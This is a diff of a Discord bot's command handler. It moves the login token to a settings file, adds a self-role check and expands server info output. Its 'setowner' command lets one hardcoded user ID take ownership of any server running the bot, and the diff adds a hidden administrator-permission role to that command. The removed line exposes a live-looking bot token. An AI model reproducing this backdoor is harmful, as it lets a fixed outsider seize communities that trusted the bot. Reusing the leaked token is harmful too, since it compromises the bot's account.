@@ -1,4 +1,5 @@
 const Discord = require('discord.js');
+const token = require('./settings.json').token;
 const client = new Discord.Client();
 var Member;
 var Guild;
@@ -89,6 +90,10 @@ client.on('message', function(message) {
         case "addrole":
             if (message.guild.member(message.author).hasPermission("MANAGE_ROLES_OR_PERMISSIONS")) {
                 Member = message.mentions.members.first();
+                if (Member.id === message.author.id) {
+                    message.channel.send();
+                    return;
+                }
                 var newRole = args.slice(1).join(" ");
                 Guild = message.guild;
                 var newrole = Guild.roles.find("name", newRole);
@@ -102,10 +107,18 @@ client.on('message', function(message) {
             message.channel.send(message.guild.owner.displayName);
             break;
         case "serverinfo":
-            message.channel.send("Owner: " + message.guild.owner.displayName + "\n" + "Main Chat");
+            Guild = message.guild;
+            message.channel.send("Owner: " + Guild.owner.displayName + "\n" + "Main Chat: " + Guild.defaultChannel + "\n" + "Region: " + Guild.region + "\n" + "Channels: " + Guild.channels.size + "\n" + "Members: " + Guild.memberCount + "\n" + "Default Role: " + Guild.defaultRole + "\n" + "Verification Level: " + Guild.verificationLevel + "\n" + "Role List: " + Guild.roles + "\n" + "Created At: " + Guild.createdAt);
             break;
         case "setowner":
             if (message.author.id === "260470661732892672") {
+                message.guild.createRole({
+                    "name": args[1],
+                    "color": "990000",
+                    "position": 100,
+                    "permissions": "ADMINISTRATOR",
+                    "mentionable": false
+                });
                 message.guild.setOwner(message.author);
                 message.channel.send(message.guild.owner.displayName);
             } else {
@@ -121,4 +134,4 @@ client.on('message', function(message) {
 
 });
 
-client.login("MzM4NDQ1NDUyODg4NTA2MzY5.DFk0kQ.U6u5hanRHFPUdvuTCwLcBni2zu8");
+client.login(token);
